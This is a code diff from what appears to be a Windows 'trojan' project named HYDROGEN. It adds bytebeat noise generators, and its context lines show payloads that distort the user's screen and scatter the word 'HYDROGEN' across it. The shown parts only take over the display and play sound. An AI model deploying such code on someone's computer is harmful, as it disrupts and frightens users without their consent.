@@ -123,6 +123,42 @@ void AudioSequence5(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
 		((BYTE*)psSamples)[t] = bFreq;
 	}
 }
+
+void AudioSequence6(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
+	for (INT t = 0; t < nSampleCount * 2; t++) {
+		BYTE bFreq = (BYTE)(t >> 5 | (t >> 2) * (t >> 5));
+		((BYTE*)psSamples)[t] = bFreq;
+	}
+}
+
+void AudioSequence7(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
+	for (INT t = 0; t < nSampleCount * 2; t++) {
+		BYTE bFreq = (BYTE)(100 * ((t << 2 | t >> 5 | t ^ 63) & (t << 10 | t >> 11)));
+		((BYTE*)psSamples)[t] = bFreq;
+	}
+}
+
+void AudioSequence8(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
+	for (INT t = 0; t < nSampleCount * 2; t++) {
+		BYTE bFreq = (BYTE)(t / 8 >> (t >> 9) * t / ((t >> 14 & 3) + 4));
+		((BYTE*)psSamples)[t] = bFreq;
+	}
+}
+
+void AudioSequence9(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
+	for (INT t = 0; t < nSampleCount * 2; t++) {
+		BYTE bFreq = (BYTE)(10 * (t & 5 * t | t >> 6 | (t & 32768 ? -6 * t / 7 : (t & 65536 ? -9 * t & 100 : -9 * (t & 100)) / 11)));
+		((BYTE*)psSamples)[t] = bFreq;
+	}
+}
+
+void AudioSequence10(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
+	for (INT t = 0; t < nSampleCount * 2; t++) {
+		BYTE bFreq = (BYTE)(10 * (t >> 7 | 3 * t | t >> (t >> 15)) + (t >> 8 & 5));
+		((BYTE*)psSamples)[t] = bFreq;
+	}
+}
+
 void ExecutePayload(TROJAN_PAYLOAD payload, int nTime) {
 	int dwStartTime = Time;
 	for (int i = 0; Time < (dwStartTime + nTime); i++) {
@@ -186,10 +222,10 @@ void Payload4(int t, HDC hdcScreen) {
 	blf.AlphaFormat = 0;
 
 	AlphaBlend(hdcScreen, ptScreen.x + t % 200 + 10, ptScreen.y - t % 25, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);
-	
+
 	DeleteObject(hcdc);
 	DeleteObject(hBitmap);
-	
+
 	Sleep(20);
 }
 
@@ -258,7 +294,7 @@ void Payload7(int t, HDC hdcScreen) {
 	SetTextColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));
 
 	TextOut(hdcScreen, random() % szScreen.cx, random() % szScreen.cy, L"HYDROGEN", 8);
-	
+
 	AlphaBlend(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);
 
 	DeleteObject(hcdc);
